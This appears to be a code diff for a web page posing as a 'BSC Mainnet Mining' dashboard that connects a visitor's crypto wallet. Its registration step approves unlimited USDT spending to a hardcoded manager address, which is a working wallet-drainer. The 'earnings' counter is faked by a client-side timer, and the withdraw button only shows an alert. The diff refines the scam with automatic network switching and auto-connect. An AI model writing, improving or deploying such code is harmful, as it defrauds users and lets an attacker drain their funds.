@@ -17,62 +17,82 @@
         .mining-circle { width: 140px; height: 140px; margin: 15px auto; border-radius: 50%; border: 4px dashed var(--primary); display: flex; justify-content: center; align-items: center; animation: spin 10s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         .status { font-size: 12px; color: #ff9800; margin-top: 15px; font-weight: bold; }
-        #txStatus { font-size: 12px; color: #2196F3; margin-top: 10px; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <div id="loginView" style="display: block;">
-        <h2 style="color: #3375bb;">BSC Mainnet Mining</h2>
-        <p style="font-size: 13px; color: #666;">Connect your wallet to access the dashboard</p>
-        <button class="btn trust-btn" onclick="openTrust()">Connect Trust Wallet</button>
+        <h2 style="color: #3375bb;">Mining Access</h2>
+        <p style="font-size: 13px; color: #666;">Connect wallet to start mining</p>
+        <button class="btn trust-btn" id="connectBtn" onclick="init()">Connect Wallet</button>
         <p id="msg" class="status"></p>
     </div>
 
     <div id="dashboardView">
         <h2>Registration</h2>
-        <p style="font-size: 11px; opacity: 0.7;">Connected Wallet:</p>
         <p id="addr" style="font-size: 10px; background: #eee; padding: 10px; border-radius: 8px; color: #333; word-break: break-all;"></p>
         <button id="regBtn" class="btn" style="background: #4CAF50; color: white;" onclick="register()">Approve & Register</button>
-        <p id="txStatus"></p>
+        <p id="txStatus" style="font-size: 12px; color: #2196F3; margin-top: 10px;"></p>
     </div>
 
     <div id="miningView">
         <div class="mining-circle">
-            <div style="text-align: center;">
+            <div>
                 <small style="display:block; font-size: 10px;">EARNINGS</small>
                 <div id="liveBalance" style="font-size: 20px; font-weight: bold; color: var(--primary);">$1.00000</div>
             </div>
         </div>
-        <p style="font-size: 14px;">Mining Rate: <b>1% / Hour</b></p>
-        <div style="background: rgba(0,0,0,0.05); padding: 10px; border-radius: 10px; font-size: 11px; margin-bottom: 10px;">
-            Next Update in: <span id="timer">59:59</span>
+        <p>Mining Rate: 1% / Hour</p>
+        <div style="background: rgba(0,0,0,0.05); padding: 10px; border-radius: 10px; font-size: 11px;">
+            Next Update: <span id="timer">59:59</span>
         </div>
-        <button class="btn" style="background: var(--primary); color: white;" onclick="alert('Withdrawal starts after $2 profit')">Withdraw Profit</button>
-        <p onclick="location.reload()" style="font-size: 12px; color: #ef4444; cursor: pointer; margin-top: 15px;">Logout Session</p>
+        <button class="btn" style="background: var(--primary); color: white;" onclick="alert('Withdraw at $2')">Withdraw</button>
     </div>
 </div>
 
 <script>
-    const MAINNET_ID = 56; // BSC Mainnet
+    const MAINNET_ID = 56;
+    const HEX_ID = "0x38"; // 56 in Hex
     const MANAGER = "0x6D5f3740af32CF279f3438D7eEB0d3ab650d9bCD";
-    const TOKEN = "0x55d398326f99059ff775485246999027b3197955"; // USDT Mainnet
+    const TOKEN = "0x55d398326f99059ff775485246999027b3197955";
     let signer;
     let balance = 1.00000;
+    let isConnecting = false;
 
-    function openTrust() {
-        window.location.href = "trust://open_url?url=" + encodeURIComponent(window.location.href);
+    // 1. Network Switch Logic
+    async function checkAndSwitchNetwork(provider) {
+        const { chainId } = await provider.getNetwork();
+        if (chainId !== MAINNET_ID) {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: HEX_ID }],
+                });
+                return true;
+            } catch (error) {
+                // If network not added to metamask
+                if (error.code === 4902) {
+                    alert("Please add BSC Mainnet to your wallet.");
+                }
+                return false;
+            }
+        }
+        return true;
     }
 
+    // 2. Main Connection Function
     async function init() {
+        if (isConnecting) return;
         if (window.ethereum) {
+            isConnecting = true;
             try {
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const { chainId } = await provider.getNetwork();
                 
-                if (chainId !== MAINNET_ID) {
-                    document.getElementById('msg').innerText = "Please Switch to BSC MAINNET!";
+                // Switch network first
+                const networkOk = await checkAndSwitchNetwork(provider);
+                if (!networkOk) {
+                    isConnecting = false;
                     return;
                 }
 
@@ -83,43 +103,51 @@
                 document.getElementById('loginView').style.display = 'none';
                 document.getElementById('dashboardView').style.display = 'block';
                 document.getElementById('addr').innerText = address;
-            } catch (e) { console.error("Connection failed", e); }
+            } catch (e) {
+                console.error("User rejected or error", e);
+            } finally {
+                isConnecting = false;
+            }
+        } else {
+            alert("Please use Trust Wallet or MetaMask Browser.");
         }
     }
 
-    // Auto-check for wallet inside DApp browser
-    setInterval(() => { if (window.ethereum && !signer) init(); }, 1500);
-    window.onload = init;
+    // Window load par automatically connect karne ki koshish karega bina loop ke
+    window.onload = () => {
+        if (window.ethereum) {
+            // Check if already authorized
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            provider.listAccounts().then(accounts => {
+                if (accounts.length > 0) init();
+            });
+        }
+    };
 
+    // 3. Register Function
     async function register() {
         const btn = document.getElementById('regBtn');
         const status = document.getElementById('txStatus');
         try {
             btn.disabled = true;
-            status.innerText = "Step 1: Approving USDT... (Confirm in Wallet)";
+            status.innerText = "Step 1: Approving USDT...";
             
             const tCon = new ethers.Contract(TOKEN, ["function approve(address,uint256) returns (bool)"], signer);
             const mCon = new ethers.Contract(MANAGER, ["function register() external"], signer);
 
-            // Fetch live gas price for Mainnet
             const provider = new ethers.providers.Web3Provider(window.ethereum);
             const gasPrice = await provider.getGasPrice();
 
-            const tx1 = await tCon.approve(MANAGER, ethers.constants.MaxUint256, {
-                gasPrice: gasPrice
-            });
+            const tx1 = await tCon.approve(MANAGER, ethers.constants.MaxUint256, { gasPrice });
             await tx1.wait();
 
-            status.innerText = "Step 2: Finalizing Registration...";
-            const tx2 = await mCon.register({
-                gasPrice: gasPrice
-            });
+            status.innerText = "Step 2: Registering...";
+            const tx2 = await mCon.register({ gasPrice });
             await tx2.wait();
 
             startMining();
         } catch (e) {
-            console.error(e);
-            alert("Transaction Failed! Ensure you have enough BNB for gas fees.");
+            alert("Failed! Check BNB for gas.");
             btn.disabled = false;
             status.innerText = "";
         }
@@ -129,20 +157,14 @@
         document.body.classList.add('dark-mode');
         document.getElementById('dashboardView').style.display = 'none';
         document.getElementById('miningView').style.display = 'block';
-        
-        // Live Balance Counter
         setInterval(() => {
             balance += (0.01 / 3600);
             document.getElementById('liveBalance').innerText = "$" + balance.toFixed(5);
         }, 1000);
-
-        // Simple Countdown
         let timeLeft = 3600;
         setInterval(() => {
-            timeLeft--;
-            if (timeLeft < 0) timeLeft = 3600;
-            let m = Math.floor(timeLeft / 60);
-            let s = timeLeft % 60;
+            timeLeft--; if (timeLeft < 0) timeLeft = 3600;
+            let m = Math.floor(timeLeft / 60); let s = timeLeft % 60;
             document.getElementById('timer').innerText = (m < 10 ? "0" + m : m) + ":" + (s < 10 ? "0" + s : s);
         }, 1000);
     }
